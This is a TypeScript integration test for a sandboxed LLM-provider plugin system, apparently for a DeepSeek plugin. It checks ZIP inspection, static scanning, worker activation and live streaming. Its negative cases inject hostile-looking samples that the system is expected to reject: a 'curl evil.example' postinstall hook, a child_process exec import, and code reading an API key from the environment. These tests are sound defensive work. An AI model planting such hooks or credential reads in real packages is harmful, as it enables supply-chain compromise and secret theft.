/**
 * piwork-llm-* 插件机制端到端验证（Phase 0 退出条件）。
 *
 * 链路：插件目录 → 打包 ZIP → inspect 检查（含负向用例）→ 从源码构建
 * artifact → 静态扫描 → Worker 隔离宿主 activate → 契约校验 →
 * validateCredentials（真实探测）→ 注册进 Pi Models → 真实 DeepSeek
 * 流式调用（文本 / thinking / abort）。
 *
 * 凭据来源：.env.local 的 DEEPSEEK_API_KEY（临时方案）。
 * 用法：pnpm tsx tests/integration/plugin-chain.mts
 */
import { readdir, readFile } from "node:fs/promises";
import { basename, join, resolve } from "node:path";
import type { AssistantMessageEvent } from "@earendil-works/pi-ai";
import { createModels } from "@earendil-works/pi-ai";
import { parse as parseEnv } from "dotenv";
import { unzipSync, zipSync } from "fflate";

import { buildPluginArtifact } from "../../lib/model-plugins/build";
import { PluginPackageError } from "../../lib/model-plugins/contract";
import {
  HostedPiProviderAdapter,
  WorkerThreadPluginHost,
} from "../../lib/model-plugins/host/worker-host";
import { inspectPluginZip } from "../../lib/model-plugins/inspect";

const PLUGIN_DIR = "plugins/piwork-llm-deepseek";

let passed = 0;
const failures: string[] = [];

function check(name: string, condition: boolean, detail?: string) {
  if (condition) {
    passed += 1;
    console.log(`  ✓ ${name}`);
    return;
  }
  failures.push(detail ? `${name} — ${detail}` : name);
  console.error(`  ✗ ${name}${detail ? ` — ${detail}` : ""}`);
}

function expectPackageError(name: string, error: unknown, code: string) {
  const isMatch = error instanceof PluginPackageError && error.code === code;
  check(name, isMatch, error instanceof Error ? error.message : String(error));
}

async function zipPluginDir(dir: string): Promise<Uint8Array> {
  const root = resolve(process.cwd(), dir);
  const entries: Record<string, Uint8Array> = {};
  const walk = async (current: string) => {
    for (const item of await readdir(current, { withFileTypes: true })) {
      if (item.name === "dist" || item.name === "node_modules") {
        continue;
      }
      const absolute = join(current, item.name);
      if (item.isDirectory()) {
        // biome-ignore lint/performance/noAwaitInLoops: 目录树需按序递归
        await walk(absolute);
        continue;
      }
      entries[absolute.slice(root.length + 1)] = new Uint8Array(
        await readFile(absolute)
      );
    }
  };
  await walk(root);
  return zipSync(entries, { level: 9 });
}

/** 修改包内单个 JSON 文件后重打包 */
function withJsonPatched(
  zipBytes: Uint8Array,
  fileName: string,
  patch: (value: Record<string, unknown>) => Record<string, unknown>
): Uint8Array {
  const entries = { ...unzipSync(zipBytes) };
  const json = JSON.parse(new TextDecoder().decode(entries[fileName]));
  const encoded = new TextEncoder().encode(
    JSON.stringify(patch(json), null, 2)
  );
  return zipSync({ ...entries, [fileName]: encoded }, { level: 9 });
}

function withExtraFile(
  zipBytes: Uint8Array,
  fileName: string,
  content: string
): Uint8Array {
  const entries = { ...unzipSync(zipBytes) };
  return zipSync(
    { ...entries, [fileName]: new TextEncoder().encode(content) },
    { level: 9 }
  );
}

async function collectEvents(
  events: AssistantMessageEvent[],
  stream: AsyncIterable<AssistantMessageEvent>,
  until: (event: AssistantMessageEvent) => boolean
): Promise<void> {
  for await (const event of stream) {
    events.push(event);
    if (until(event)) {
      return;
    }
  }
}

async function main() {
  // .env.local → process.env（脚本不经过 Next.js 加载器）
  const envLocal = parseEnv(
    await readFile(resolve(process.cwd(), ".env.local"))
  );
  for (const [key, value] of Object.entries(envLocal)) {
    process.env[key] ??= value;
  }
  if (!process.env.DEEPSEEK_API_KEY) {
    throw new Error(
      "DEEPSEEK_API_KEY missing in .env.local — cannot verify live chain"
    );
  }

  console.log("\n[1/7] 打包插件目录");
  const zipBytes = await zipPluginDir(PLUGIN_DIR);
  const fileName = `${basename(PLUGIN_DIR)}.zip`;
  check("zip built", zipBytes.byteLength > 0);

  console.log("\n[2/7] inspect：命名 / 结构 / manifest 检查");
  const inspection = inspectPluginZip(fileName, zipBytes);
  check("packageId", inspection.packageId === "piwork-llm-deepseek");
  check("providerKey", inspection.providerKey === "deepseek");
  check("networkHosts", inspection.networkHosts.includes("api.deepseek.com"));
  check("sha256", /^[0-9a-f]{64}$/.test(inspection.sha256));

  expectPackageError(
    "reject: missing prefix (deepseek.zip)",
    attempt(() => inspectPluginZip("deepseek.zip", zipBytes)),
    "invalid_file_name"
  );
  expectPackageError(
    "reject: version in file name",
    attempt(() => inspectPluginZip("piwork-llm-deepseek-1.2.0.zip", zipBytes)),
    "invalid_file_name"
  );
  expectPackageError(
    "reject: uppercase provider",
    attempt(() => inspectPluginZip("piwork-llm-DeepSeek.zip", zipBytes)),
    "invalid_file_name"
  );
  expectPackageError(
    "reject: manifest provider mismatch",
    attempt(() =>
      inspectPluginZip(
        fileName,
        withJsonPatched(zipBytes, "piwork.plugin.json", (m) => ({
          ...m,
          provider: "not-deepseek",
        }))
      )
    ),
    "manifest_provider_mismatch"
  );
  expectPackageError(
    "reject: manifest id mismatch",
    attempt(() =>
      inspectPluginZip(
        fileName,
        withJsonPatched(zipBytes, "piwork.plugin.json", (m) => ({
          ...m,
          id: "piwork-llm-other",
        }))
      )
    ),
    "manifest_id_mismatch"
  );
  expectPackageError(
    "reject: python file",
    attempt(() =>
      inspectPluginZip(fileName, withExtraFile(zipBytes, "evil.py", "print(1)"))
    ),
    "forbidden_file"
  );
  expectPackageError(
    "reject: package scripts",
    attempt(() =>
      inspectPluginZip(
        fileName,
        withJsonPatched(zipBytes, "package.json", (p) => ({
          ...p,
          scripts: { postinstall: "curl evil.example" },
        }))
      )
    ),
    "forbidden_scripts"
  );
  expectPackageError(
    "reject: non-allowlisted dependency",
    attempt(() =>
      inspectPluginZip(
        fileName,
        withJsonPatched(zipBytes, "package.json", (p) => ({
          ...p,
          dependencies: {
            ...((p.dependencies as Record<string, string>) ?? {}),
            lodash: "4.17.21",
          },
        }))
      )
    ),
    "forbidden_dependencies"
  );

  console.log("\n[3/7] 静态扫描（构建期对 src/ 全量扫描）");
  expectPackageError(
    "reject: child_process in src",
    await attemptAsync(() =>
      buildPluginArtifact(
        withExtraFile(
          zipBytes,
          "src/evil.ts",
          "import { exec } from 'node:child_process';\nexport const x = exec;\n"
        ),
        inspectPluginZip(
          fileName,
          withExtraFile(
            zipBytes,
            "src/evil.ts",
            "import { exec } from 'node:child_process';\nexport const x = exec;\n"
          )
        )
      )
    ),
    "static_scan_failed"
  );
  expectPackageError(
    "reject: process.env in src",
    await attemptAsync(() =>
      buildPluginArtifact(
        withExtraFile(
          zipBytes,
          "src/envy.ts",
          "export const key = process.env.DEEPSEEK_API_KEY;\n"
        ),
        inspectPluginZip(
          fileName,
          withExtraFile(
            zipBytes,
            "src/envy.ts",
            "export const key = process.env.DEEPSEEK_API_KEY;\n"
          )
        )
      )
    ),
    "static_scan_failed"
  );

  console.log("\n[4/7] 从源码构建 artifact（esbuild 单文件 ESM bundle）");
  const artifact = await buildPluginArtifact(zipBytes, inspection);
  const rebuilt = await buildPluginArtifact(zipBytes, inspection);
  check("bundle built", artifact.entryPath.endsWith("dist/index.js"));
  check("build hash stable", artifact.buildHash === rebuilt.buildHash);
  console.log(`    buildHash=${artifact.buildHash.slice(0, 16)}…`);

  console.log("\n[5/7] Worker 隔离宿主 activate + 契约校验");
  const host = new WorkerThreadPluginHost();
  const snapshot = await host.activate({
    artifactEntry: artifact.entryPath,
    config: {},
    credentials: {
      api_key: process.env.DEEPSEEK_API_KEY,
    },
    installationId: "verify:deepseek",
    providerId: "deepseek",
    runtimeProviderId: "deepseek",
  });
  check("provider id = runtimeProviderId", snapshot.provider.id === "deepseek");
  check(
    "model catalog registered",
    snapshot.provider.models.length === 4,
    `got ${snapshot.provider.models.length}`
  );
  const modelIds = snapshot.provider.models.map((m) => m.id);
  check("model ids unique", new Set(modelIds).size === modelIds.length);
  check(
    "definition serializable",
    Boolean(JSON.parse(JSON.stringify(snapshot.definition)).credentialFields)
  );
  check(
    "vision model input includes image",
    snapshot.provider.models
      .find((m) => m.id === "deepseek-flash")
      ?.input.includes("image") === true
  );

  console.log("\n[6/7] validateCredentials（真实 DeepSeek 探测请求）");
  await host.validateCredentials({
    config: {},
    credentials: { api_key: process.env.DEEPSEEK_API_KEY },
  });
  check("credentials valid", true);
  let invalidRejected = false;
  try {
    await host.validateCredentials({
      config: {},
      credentials: { api_key: "sk-invalid-key-for-verification" },
    });
  } catch {
    invalidRejected = true;
  }
  check("invalid key rejected", invalidRejected);

  console.log("\n[7/7] Pi 调用链：注册 registry → 真实流式调用");
  const adapter = new HostedPiProviderAdapter(snapshot, host, {
    apiKey: process.env.DEEPSEEK_API_KEY,
    name: "DeepSeek API key (verify)",
  });
  const piModels = createModels();
  piModels.setProvider(adapter);

  const resolved = piModels.getModel("deepseek", "deepseek-v4-flash");
  check("getModel resolves plugin model", Boolean(resolved));
  if (!resolved) {
    throw new Error(
      "deepseek/deepseek-v4-flash not resolvable — cannot continue"
    );
  }

  // 7a. 基础文本流
  const textEvents: AssistantMessageEvent[] = [];
  const textStream = piModels.streamSimple(resolved, {
    messages: [
      {
        content: "用一句话回答：1+1等于几？",
        role: "user",
        timestamp: Date.now(),
      },
    ],
    systemPrompt: "You are a concise assistant. Answer in Chinese.",
  });
  await collectEvents(
    textEvents,
    textStream,
    (e) => e.type === "done" || e.type === "error"
  );
  const textDeltas = textEvents.filter((e) => e.type === "text_delta").length;
  const done = textEvents.find((e) => e.type === "done");
  const streamError = textEvents.find((e) => e.type === "error");
  check(
    "text deltas received",
    textDeltas > 0,
    `events: ${textEvents.map((e) => e.type).join(",")}`
  );
  check(
    "stream completed with stop",
    Boolean(done) && (done as { reason: string }).reason === "stop",
    streamError
      ? JSON.stringify(
          (streamError as { error: { errorMessage?: string } }).error
            ?.errorMessage
        )
      : "no done event"
  );
  const finalText = done
    ? (done as { message: { content: { text?: string }[] } }).message.content
        .filter((p) => "text" in p)
        .map((p) => p.text)
        .join("")
    : "";
  check(
    "final text non-empty",
    finalText.length > 0,
    `text="${finalText.slice(0, 60)}"`
  );
  console.log(`    回复片段：${finalText.slice(0, 80)}`);

  // 7b. thinking 流（reasoning → DeepSeek thinking 参数）
  const thinkingEvents: AssistantMessageEvent[] = [];
  const thinkingStream = piModels.streamSimple(
    resolved,
    {
      messages: [
        {
          content: "9.11 和 9.9 哪个大？先想一想。",
          role: "user",
          timestamp: Date.now(),
        },
      ],
      systemPrompt: "Think briefly, then answer.",
    },
    { maxTokens: 2048, reasoning: "low" }
  );
  await collectEvents(
    thinkingEvents,
    thinkingStream,
    (e) => e.type === "done" || e.type === "error"
  );
  const thinkingDeltas = thinkingEvents.filter(
    (e) => e.type === "thinking_delta"
  ).length;
  const thinkingDone = thinkingEvents.find((e) => e.type === "done");
  check(
    "thinking deltas received",
    thinkingDeltas > 0,
    `events: ${thinkingEvents.map((e) => e.type).join(",")}`
  );
  check("thinking stream completed", Boolean(thinkingDone));

  // 7c. abort 中断
  const abortEvents: AssistantMessageEvent[] = [];
  const abortController = new AbortController();
  const abortStream = piModels.streamSimple(
    resolved,
    {
      messages: [
        { content: "写一篇 500 字的散文", role: "user", timestamp: Date.now() },
      ],
      systemPrompt: "You are a writer.",
    },
    { signal: abortController.signal }
  );
  const collection = (async () => {
    for await (const event of abortStream) {
      abortEvents.push(event);
      if (event.type === "text_delta" || event.type === "thinking_delta") {
        abortController.abort();
      }
    }
  })();
  await collection;
  const abortTerminal = abortEvents.find(
    (e) =>
      (e.type === "error" &&
        ((e as { reason: string }).reason === "aborted" ||
          (e as { error: { stopReason?: string } }).error?.stopReason ===
            "aborted")) ||
      e.type === "done"
  );
  check(
    "abort terminates stream",
    Boolean(abortTerminal),
    `events: ${abortEvents.map((e) => e.type).join(",")}`
  );

  await host.dispose();

  console.log(
    `\n========== 验证结果：${passed} 项通过，${failures.length} 项失败 ==========`
  );
  if (failures.length > 0) {
    for (const failure of failures) {
      console.error(`  ✗ ${failure}`);
    }
    process.exit(1);
  }
}

function attempt(fn: () => unknown): unknown {
  try {
    fn();
    return new Error("expected rejection but call succeeded");
  } catch (error) {
    return error;
  }
}

async function attemptAsync(fn: () => Promise<unknown>): Promise<unknown> {
  try {
    await fn();
    return new Error("expected rejection but call succeeded");
  } catch (error) {
    return error;
  }
}

main().catch((error) => {
  console.error("\nVerification crashed:", error);
  process.exit(1);
});
